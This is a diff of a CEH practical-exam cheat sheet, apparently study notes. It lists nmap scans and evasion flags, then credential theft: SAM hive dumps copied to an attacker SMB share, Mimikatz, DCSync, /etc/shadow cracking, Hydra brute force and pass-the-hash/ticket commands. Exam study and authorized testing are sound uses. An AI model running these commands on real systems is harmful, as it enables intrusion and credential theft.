@@ -7,18 +7,18 @@ Cheat sheet for CEH v13 Pratical Exam on May 15th, 2026
 ```bash
 # -sn disables port scan
 # -Pn assumes host is up
-nmap -sn -PE <IP>                                   # ICMP Echo ping
-nmap -sn -PE <IP Range>                             # ICMP Echo sweep
-nmap -sn -PP <IP>                                   # ICMP Timestamp ping
-nmap -sn -PM <IP>                                   # ICMP Address Mask ping
-nmap -sn -PR <IP>                                   # ARP ping
-nmap -sn -PU <IP>                                   # UDP ping
-nmap -sn -PS <IP>                                   # TCP SYN ping
-nmap -sn -PA <IP>                                   # TCP ACK ping
-nmap -sn -PO <IP>                                   # IP Protocol ping
-nmap -6sn -PA <IP>                                  # IPv6 ping
-nmap -sn -PE --reason <IP>                          # Show why host marked alive
-nmap -sn -PE --packet-trace --disable-arp-ping <IP> # Trace packets, no ARP
+nmap -sn -PE [IP]                                   # ICMP Echo ping
+nmap -sn -PE [IP RANGE]                             # ICMP Echo sweep
+nmap -sn -PP [IP]                                   # ICMP Timestamp ping
+nmap -sn -PM [IP]                                   # ICMP Address Mask ping
+nmap -sn -PR [IP]                                   # ARP ping
+nmap -sn -PU [IP]                                   # UDP ping
+nmap -sn -PS [IP]                                   # TCP SYN ping
+nmap -sn -PA [IP]                                   # TCP ACK ping
+nmap -sn -PO [IP]                                   # IP Protocol ping
+nmap -6sn -PA [IP]                                  # IPv6 ping
+nmap -sn -PE --reason [IP]                          # Show why host marked alive
+nmap -sn -PE --packet-trace --disable-arp-ping [IP] # Trace packets, no ARP
 ```
 
 ---
@@ -26,33 +26,33 @@ nmap -sn -PE --packet-trace --disable-arp-ping <IP> # Trace packets, no ARP
 ### Port Scanning
 ```bash
 # Full/Open
-nmap -sT -v <IP>           # TCP Connect (full open)
+nmap -sT -v [IP]           # TCP Connect (full open)
 
 # Stealth
-nmap -sS -v <IP>           # SYN/Half-open stealth scan
-nmap -sF -v <IP>           # FIN scan
-nmap -sN -v <IP>           # NULL scan
-nmap -sX -v <IP>           # Xmas scan (FIN+URG+PSH)
-nmap -sM -v <IP>           # TCP Maimon scan (FIN/ACK)
-nmap -sA -v <IP>           # ACK flag probe scan
-nmap -sA --ttl 100 -v <IP> # TTL-based scan
-nmap -sW -v <IP>           # Window scan
+nmap -sS -v [IP]           # SYN/Half-open stealth scan
+nmap -sF -v [IP]           # FIN scan
+nmap -sN -v [IP]           # NULL scan
+nmap -sX -v [IP]           # Xmas scan (FIN+URG+PSH)
+nmap -sM -v [IP]           # TCP Maimon scan (FIN/ACK)
+nmap -sA -v [IP]           # ACK flag probe scan
+nmap -sA --ttl 100 -v [IP] # TTL-based scan
+nmap -sW -v [IP]           # Window scan
 
 # Other
-nmap -sU -v <IP>           # UDP scan
-nmap -sY -v <IP>           # SCTP INIT scan
-nmap -sZ -v <IP>           # SCTP COOKIE ECHO scan
-nmap -Pn -p- -sI <IP>      # IDLE/IPID spoofed scan
+nmap -sU -v [IP]           # UDP scan
+nmap -sY -v [IP]           # SCTP INIT scan
+nmap -sZ -v [IP]           # SCTP COOKIE ECHO scan
+nmap -Pn -p- -sI [IP]      # IDLE/IPID spoofed scan
 ```
 
 ---
 
 ### Service & OS Detection
 ```bash
-nmap -sV <IP>                           # Service version detection
-nmap -O  <IP>                           # OS detection
-nmap -A  <IP>                           # Aggressive (OS+version+scripts+traceroute)
-nmap --script smb-os-discovery.nse <IP> # SMB OS discovery (determine the OS, computer name, domain, workgroup, and current time over the SMB protocol 445/139)
+nmap -sV [IP]                           # Service version detection
+nmap -O  [IP]                           # OS detection
+nmap -A  [IP]                           # Aggressive (OS+version+scripts+traceroute)
+nmap --script smb-os-discovery.nse [IP] # SMB OS discovery (determine the OS, computer name, domain, workgroup, and current time over the SMB protocol 445/139)
 ```
 
 #### OS TTL Reference
@@ -70,36 +70,36 @@ nmap --script smb-os-discovery.nse <IP> # SMB OS discovery (determine the OS, co
 
 ### Performance Tuning
 ```bash
-nmap --max-retries 0 <IP>                        # No retries (fastest)
-nmap --max-retries 3 <IP>                        # Reduce retries (default 10)
-nmap --min-rate 300 <IP>                         # Min packets per second
-nmap --max-rtt-timeout 100ms <IP>                # Max round trip timeout
-nmap --min-parallelism 10 <IP>                   # Min parallel probes
+nmap --max-retries 0 [IP]                        # No retries (fastest)
+nmap --max-retries 3 [IP]                        # Reduce retries (default 10)
+nmap --min-rate 300 [IP]                         # Min packets per second
+nmap --max-rtt-timeout 100ms [IP]                # Max round trip timeout
+nmap --min-parallelism 10 [IP]                   # Min parallel probes
 ```
 
 ---
 
 ### Evading IDS/Firewall
 ```bash
-nmap -f <IP>                          # Packet fragmentation
-nmap -mtu 8 <IP>                      # Custom MTU (8 bytes)
-nmap -g 80 <IP>                       # Source port manipulation
-nmap -D RND:10 <IP>                   # IP decoy (10 random decoys)
-nmap -sT -Pn --spoof-mac 0 <IP>       # Random MAC spoofing
-nmap --randomize-hosts <IP>           # Randomize host scan order
-nmap --badsum <IP>                    # Bad checksum packets
-nmap -Pn -n --disable-arp-ping <IP>   # Suppress ICMP/DNS/ARP
-hping3  -a 7.7.7.7 <IP>               # IP address spoofing
+nmap -f [IP]                          # Packet fragmentation
+nmap -mtu 8 [IP]                      # Custom MTU (8 bytes)
+nmap -g 80 [IP]                       # Source port manipulation
+nmap -D RND:10 [IP]                   # IP decoy (10 random decoys)
+nmap -sT -Pn --spoof-mac 0 [IP]       # Random MAC spoofing
+nmap --randomize-hosts [IP]           # Randomize host scan order
+nmap --badsum [IP]                    # Bad checksum packets
+nmap -Pn -n --disable-arp-ping [IP]   # Suppress ICMP/DNS/ARP
+hping3  -a 7.7.7.7 [IP]               # IP address spoofing
 ```
 
 ---
 
 ### Hping3 Reference
 ```bash
-hping3 -A  -p 80 <IP>                       # ACK scan port 80
-hping3 -2  -p 80 <IP>                       # UDP scan port 80
-hping3 -Q -p 139 -s <IP>                    # Collect ISN
-hping3 -S  -p 80 --tcp-timestamp <IP>       # Firewall timestamp
+hping3 -A  -p 80 [IP]                       # ACK scan port 80
+hping3 -2  -p 80 [IP]                       # UDP scan port 80
+hping3 -Q -p 139 -s [IP]                    # Collect ISN
+hping3 -S  -p 80 --tcp-timestamp [IP]       # Firewall timestamp
 ```
 
 ---
@@ -125,38 +125,38 @@ hping3 -S  -p 80 --tcp-timestamp <IP>       # Firewall timestamp
 | SCTP INIT | INIT+ACK | ABORT |
 | SCTP COOKIE | No response | ABORT |
 
-## Scanning Networks
+## Enumeration
+
 ### NetBIOS Enumeration
 ```bash
-nbtstat -a <IP>        # NetBIOS name table of remote machine
-nbtstat -c <IP>        # NetBIOS name cache + resolved IPs
+nbtstat -a [IP]        # NetBIOS name table of remote machine
+nbtstat -c [IP]        # NetBIOS name cache + resolved IPs
 net use                # Connection status, shared folders, network info
 net view \\            # List shared resources on remote host
 net view /domain:      # List shares by domain
 ```
-
 ---
 
 ### SNMP Enumeration
 ```bash
-snmpwalk -v1 -c public <IP>                   # SNMP v1 walk
-snmpwalk -v2c -c public <IP>                  # SNMP v2c walk
-nmap -sU -p 161 --script=snmp-processes <IP>  # SNMP via Nmap
+snmpwalk -v1 -c public [IP]                   # SNMP v1 walk
+snmpwalk -v2c -c public [IP]                  # SNMP v2c walk
+nmap -sU -p 161 --script=snmp-processes [IP]  # SNMP via Nmap
 ```
 ---
 
 ### LDAP Enumeration
 ```bash
-nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' <IP> 
+nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [IP] 
 ```
 
 ----
 
 ### NFS Enumeration
 ```bash
-nmap -p 2049 <IP>                   # Check NFS port
-showmount -e <IP>                   # Show exported directories
-rpcinfo -p   <IP>                   # RPC info
+nmap -p 2049 [IP]                   # Check NFS port
+showmount -e [IP]                   # Show exported directories
+rpcinfo -p   [IP]                   # RPC info
 ```
 
 **SuperEnum:**
@@ -186,49 +186,49 @@ nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=
 
 Process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server. If the DNS transfer setting is enabled on the target DNS server, it will give DNS information; if not, it will return an error saying it has failed or refuses the zone transfer.
 ```bash
-> dig <HOST> OR dig ns <HOST>            # Find the name servers
-> dig @<NS RECORD NAME> <HOST> axfr      # Attempt zone transfer (AXFR = ALL records are returned to secondary DNS server)
+> dig [HOST] OR dig ns [HOST]            # Find the name servers
+> dig @[NS RECORD NAME] [HOST] axfr      # Attempt zone transfer (AXFR = ALL records are returned to secondary DNS server)
 ```
 **Zone Transfer (Windows)**
 ```
 > nslookup
 > set querytype=soa
-> <HOST>
-> ls -d <PRIMARY NAME SERVER>
+> [HOST]
+> ls -d [PRIMARY NAME SERVER]
 ```
 
 **Cache Snooping**
 
 Technique whereby an attacker queries the DNS server for a specific cached DNS record
 ```
-dig @<IP of DNS SERVER> <TARGET DOMAIN> A +norecurse    # Send a non-recursive query by setting the Recursion Desired (RD) bit in the query header to 0
-dig @<IP of DNS SERVER> <TARGET DOMAIN> A +recurse      # Send a recursive query to determine the time the DNS record resides in cache
+dig @[IP of DNS SERVER] [TARGET DOMAIN] A +norecurse    # Send a non-recursive query by setting the Recursion Desired (RD) bit in the query header to 0
+dig @[IP of DNS SERVER] [TARGET DOMAIN] A +recurse      # Send a recursive query to determine the time the DNS record resides in cache
 ```
 
 **DNSSEC Zone Walking**
 
 Technique whereby an attacker attempts to obtain internal records of the DNS server if the DNS zone is not properly configured
 ```
-ldns-walk @<IP of DNS SERVER> <TARGET DOMAIN>
-dnsrecon -d <TARGET DOMAIN> -z
+ldns-walk @[IP of DNS SERVER] [TARGET DOMAIN]
+dnsrecon -d [TARGET DOMAIN] -z
 ```
 
 **Amass**
 
 Tool used to map the target network and discover potential attack surfaces
 ```
-amass enum -passive -d <TARGET DOMAIN> -src                                            # Perform passive enumeration
-amass enum -active -d <TARGET DOMAIN> -brute -w /usr/share/wordlist/amass/all.txt      # Perform active enumeration through brute-forcing
-amass track -config /root/amass/config.ini -dir amass4owasp -d <TARGET DOMAIN> -last 2 # Track or compare the last two enumeration scans
+amass enum -passive -d [TARGET DOMAIN] -src                                            # Perform passive enumeration
+amass enum -active -d [TARGET DOMAIN] -brute -w /usr/share/wordlist/amass/all.txt      # Perform active enumeration through brute-forcing
+amass track -config /root/amass/config.ini -dir amass4owasp -d [TARGET DOMAIN] -last 2 # Track or compare the last two enumeration scans
 ```
 
 ---
 
 ### SMTP Enumeration
 ```bash
-nmap -p 25 --script=smtp-enum-users <IP>     # List mail users
-nmap -p 25 --script=smtp-open-relay <IP>     # Check open relay
-nmap -p 25 --script=smtp-commands <IP>       # List SMTP commands
+nmap -p 25 --script=smtp-enum-users [IP]     # List mail users
+nmap -p 25 --script=smtp-open-relay [IP]     # Check open relay
+nmap -p 25 --script=smtp-commands [IP]       # List SMTP commands
 ```
 
 ---
@@ -261,8 +261,8 @@ ntpq [-46dinp] [-c command] [host/ip_address]
 
 ### ISAKMP/IKE (VPN) Enumeration
 ```bash
-nmap -sU -p 500 <IP>
-ike-scan -M <IP>
+nmap -sU -p 500 [IP]
+ike-scan -M [IP]
 ```
 
 ---
@@ -292,7 +292,23 @@ nmap -p 22 --script ssh-brute
 ```
 ---
 
-### What Each Protocol Gives You
+### Sublist3r (Subdomain Enumeration)
+```
+sublist3r -d [DOMAIN]                   # Basic command
+sublist3r -d [DOMAIN] -o [OUTPUT_FILE]  # Save results to file
+sublist3r -v -d [DOMAIN]                # Verbose output
+```
+---
+
+### Gobuster (Directory Enumeration)
+```
+# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+gobuster dir -u [URL] -w [WORDLIST]              # Basic command
+gobuster dir -u [URL] -w [WORDLIST] -x php,html  # File extnsion
+gobuster dir -u https://[URL] -w [WORDLIST] -k   # HTTPS Insecure
+```
+
 ### What Each Protocol Gives You
 | Protocol | Ports | Data Obtained |
 |----------|-------|--------------|
@@ -311,61 +327,172 @@ nmap -p 22 --script ssh-brute
 
 ## Password Cracking
 ### Hash ID
-Check supplies hashes against a built-in list to suggest potential formats. 
-- `hashid -j 193069ceb0461e1d40d216e32c79c704`
-  - `-j` will list the corresponding JtR format
-  - `-m` will identify the hashcat type.mode
+```
+hashid -j [HASH]                    # Identify hash + JtR format
+hashid -m [HASH]                    # Identify hash + Hashcat mode
+```
+
+---
 
 ### John the Ripper (JtR)
+```
+john --single passwd                              # Single crack mode attack on file passwrd
+john --wordlist=rockyou.txt hash.txt              # Dictionary attack using wordlist rockyou.txt
+john --incremental hash.txt                       # Brute force using incremental mode
+john --format=NT hash.txt                         # Specify hash format
+john --show hash.txt                              # Show cracked passwords
 
-#### **Commands**
-- Run a single crack mode attack on file `passwrd`
-  - `john --single passwd`
-- Use a wordlist to crack passwords with a dictionary attack
-  - `john --wordlist=<wordlist_file> <hash_file>`   
-- Use incremental mode to brute-force password cracking
-  - `john --incremental <hash_file>`  
-- Use `–format` to instruct JtR which format the target hashes have
-  - `john --format=afs [...] <hash_file>`  
-- Crack password-protected or encrypted files to process files and produce hashes compatible with JtR
-  - `<xxx2john> <file_to_crack> > file.hash (i.e. pdf2john or ssh2john or wpa2john)`  
+# Convert files to JtR compatible hashes
+pdf2john file.pdf > file.hash
+ssh2john id_rsa > ssh.hash
+zip2john file.zip > zip.hash
+wpa2john capture.pcap > wpa.hash
+
+locate *2john*                                    # See all converters
+```
 
 #### **JtR Notes**
 - One of the most effective and widely used rulesets is best64.rule
 - We can generate wordlists using CeWL, a tool that scans potential words from a company’s website and saves them in a separate list
-  - `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`
-    - `-d` is depths to spider
-    - `-m` is minimum word length
-    - `–lowercase` is store words in lowercase
-    - `-w` file to be stored in
-- Use `locate *2john*` to see all the different hash options
+```
+cewl https://www.example.com -d 4 -m 6 --lowercase -w wordlist.txt
+# -d = spider depth
+# -m = minimum word length
+# --lowercase = store in lowercase
+# -w = output file
+```
+---
 
 ### Hashcat
-- Basic command
-  - `hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]`
-    - `-a` specifies attack mode
-      - `0` performs a dictionary attack
-      - `3` defines a mask attack
-    - `-m` specifies hash type
-      - `0` defines hash as md5
-      - `1000` defines hash as NTLM
-      - `2100` defines hash as DCC2 
-    - `<hashes>` is either a hash string or file condoning one or more password hashes of the same type
-    - `[wordlist, rule, mask, ...]` is placeholder for additional arguments  
-- Perform a mask attack
-  - `hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'`
-    - `'?u?l?l?l?l?d?s'` defines passwords starting with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol
-- Use a ruleset
-  -  `hashcat -a 0 -m 0 <hash> rockyou.txt -r /usr/share/hashcat/rules/best64.rule`
+```
+hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]                        # Basic command (-a signifies dictionary attack)
+hashcat -a 3 -m 0 [HASH] '?u?l?l?l?l?d?s'                                     # Mask attack
+hashcat -a 0 -m 0 [HASH] rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # Use a ruleset
+ls -l /usr/share/hashcat/rules                                                # List available rules
+```
 
-## Attacks
+#### Common Hash Types
+| Hash | Hashcat Mode | Example |
+|------|-------------|---------|
+| MD5 | 0 | `5f4dcc3b5aa765d61d8327deb882cf99` |
+| SHA1 | 100 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
+| NTLM | 1000 | `64f12cddaa88057e06a81b54e73b949b` |
+| NetNTLMv2 | 5600 | `user::domain:challenge:hash` |
+| DCC2 | 2100 | `$DCC2$10240#user#hash` |
+| SHA512crypt (Linux) | 1800 | `$6$...` |
+| bcrypt | 3200 | `$2a$...` |
+| WPA/WPA2 | 2500 | PMKID/handshake |
+
+
+#### Hashcat Mask Characters
+| Mask | Character Set |
+|------|--------------|
+| ?u | Uppercase A-Z |
+| ?l | Lowercase a-z |
+| ?d | Digits 0-9 |
+| ?s | Symbols |
+| ?a | All of the above |
+
+## Extracting Credentials
+### Windows
+
+The Security Account Manager (SAM) is a database file in Windows operating systems that stores user account credentials. User passwords are stored as hashes in the registry, typically in the form of either LM or NTLM hashes. The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under HKLM\SAM. Viewing or accessing this file requires SYSTEM level privileges.
+
+#### Registry Hive Dump (requires SYSTEM)
+```
+# On target Windows machine, use reg.exe to copy registry hives in C:\WINDOWS\system32\
+reg.exe save hklm\sam C:\sam.save            # Local account hashes
+reg.exe save hklm\system C:\system.save      # Boot key (needed to decrypt SAM)
+reg.exe save hklm\security C:\security.save  # Cached domain creds, DPAPI
+
+# Host SMB share on Kali to receive files
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/
+
+# Transfer files from target (i.e. run these commands on target)
+move sam.save \\\CompData
+move security.save \\\CompData
+move system.save \\\CompData
+
+# Dump hashes from hives on Kali
+# Hash format (uid:rid:lmhash:nthash)
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+#### Remote SAM Dump via NetExec
+```bash
+netexec smb [IP] --local-auth -u [USER] -p [PASSWORD] --sam
+```
+
+#### NTDS.dit Dump (Domain Controller)
+
+NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at `%systemroot%/ntds` on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain
+```bash
+netexec smb [IP] -u [USER] -p [PASSWORD] -M ntdsutil
+```
+
+---
+
+#### Mimikatz
+```bash
+mimikatz.exe                  # Running this command starts Mimikatz
+privilege::debug
+sekurlsa::logonpasswords      # Dump plaintext passwords + hashes from LSASS
+sekurlsa::credman             # Dump credential manager
+sekurlsa::ekeys               # Dump Kerberos encryption keys
+sekurlsa::tickets /export     # Export Kerberos tickets (.kirbi)
+lsadump::sam                  # Dump SAM database
+lsadump::dcsync /user:Administrator  # DCSync attack
+```
+
+---
+
+### Linux
+
+#### Linux Credential Files
+| File | Contents |
+|------|----------|
+| `/etc/passwd` | User account info (no passwords on modern systems) |
+| `/etc/shadow` | Password hashes (root readable only) |
+| `/etc/security/opasswd` | Previous/old passwords |
+
+#### Linux Hash Format
+```
+$<id>$<salt>$[HASH]
+```
+| ID | Algorithm |
+|----|-----------|
+| $1 | MD5 |
+| $5 | SHA-256 |
+| $6 | SHA-512 |
+| $y | yescrypt (default modern) |
+
+#### Cracking Linux Credentials
+```bash
+sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt
+```
+
+---
+
+### Brute Forcing with Hydra
+```bash
+hydra -L users.txt -P passwords.txt ssh://10.129.42.197
+hydra -L users.txt -P passwords.txt rdp://10.129.42.197
+hydra -L users.txt -P passwords.txt smb://10.129.42.197
+hydra -C user_pass.txt ssh://10.129.42.197   # Credential stuffing user:pass list
+```
+
+
+## System Hacking Attacks
 
 ### Pass the Hash (PtH) 
 
 #### Using Mimikatz (Windows)
 ```
 privilege::debug
-sekurlsa::pth /user:julio /rc4:<hash> /domain:inlanefreight.htb /run:cmd.exe
+sekurlsa::pth /user:julio /rc4:[HASH] /domain:inlanefreight.htb /run:cmd.exe
 ```
 - `/user`: the user name we want to impersonate.
 - `/rc4` or `/NTLM`: NTLM hash of the user's password.
@@ -380,22 +507,22 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 #### Using Netexec (Linux)
 ```
 # Spray across subnet
-netexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>
+netexec smb 172.16.1.0/24 -u Administrator -d . -H [HASH]
 
 # Local auth across subnet
-netexec smb 172.16.1.0/24 -u Administrator -H <hash> --local-auth
+netexec smb 172.16.1.0/24 -u Administrator -H [HASH] --local-auth
 
 # Execute command
-netexec smb <IP> -u Administrator -d . -H <hash> -x whoami
+netexec smb [IP] -u Administrator -d . -H [HASH] -x whoami
 ```
 
-#### Using Netexec (Linux)
+#### Using Evil-WinRM (Linux)
 ```
 # Local account
-evil-winrm -i <IP> -u Administrator -H <hash>
+evil-winrm -i [IP] -u Administrator -H [HASH]
 
 # Domain account
-evil-winrm -i <IP> -u administrator@inlanefreight.htb -H <hash>
+evil-winrm -i [IP] -u administrator@inlanefreight.htb -H [HASH]
 ```
 
 
@@ -419,18 +546,18 @@ Rubeus.exe dump /nowrap          # dump all tickets as Base64
 
 **Mimikatz (RC4):**
 ```
-sekurlsa::pth /domain:domain.htb /user:username /ntlm:<hash>
+sekurlsa::pth /domain:domain.htb /user:username /ntlm:[HASH]
 ```
 **Rubeus (AES256 — preferred, less detectable):**
 ```
-Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:<hash> /nowrap
+Rubeus.exe asktgt /domain:domain.htb /user:username /aes256:[HASH] /nowrap
 ```
 
 #### 3. Pass the Ticket
 
 **Rubeus — request TGT and inject immediately:**
 ```
-Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:<hash> /ptt
+Rubeus.exe asktgt /domain:domain.htb /user:username /rc4:[HASH] /ptt
 ```
 **Rubeus — inject existing ticket:**
 ```
@@ -461,7 +588,7 @@ Enter-PSSession -ComputerName DC01
 # 1. Create sacrificial process
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 # 2. In new window, request TGT and inject
-Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:<hash> /ptt
+Rubeus.exe asktgt /user:username /domain:domain.htb /aes256:[HASH] /ptt
 # 3. Launch PowerShell
 powershell
 Enter-PSSession -ComputerName DC01
